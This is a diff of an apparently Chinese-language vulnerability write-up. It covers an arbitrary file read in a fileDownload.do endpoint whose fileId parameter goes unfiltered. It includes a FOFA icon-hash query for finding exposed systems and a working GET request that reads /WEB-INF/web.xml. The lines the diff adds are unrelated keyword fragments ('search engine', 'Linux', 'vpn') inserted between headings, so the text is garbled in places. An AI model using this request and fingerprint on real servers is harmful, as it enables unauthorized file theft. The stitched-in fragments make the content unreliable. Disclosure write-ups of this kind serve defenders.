@@ -17,8 +17,18 @@ v1.6.x
 # fofa语法
 
 > icon\_hash="1380907357"
+>
+> 计算机安全
 
 # 漏洞分析
+
+深入探索
+
+搜索引擎
+
+网络浏览器
+
+开发工具
 
 直接看 `PersonnelController` 下的 `fileDownload.do` 实现方式
 
@@ -64,6 +74,14 @@ public static String getRootPath(String path) {
 对用户可控参数 `fileId` 无任何过滤或校验，直接拼接路径返回文件路径进行文件操作，也是朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。
 
 # 漏洞复现
+
+深入探索
+
+代理与过滤
+
+Linux
+
+vpn
 
 ```
 GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
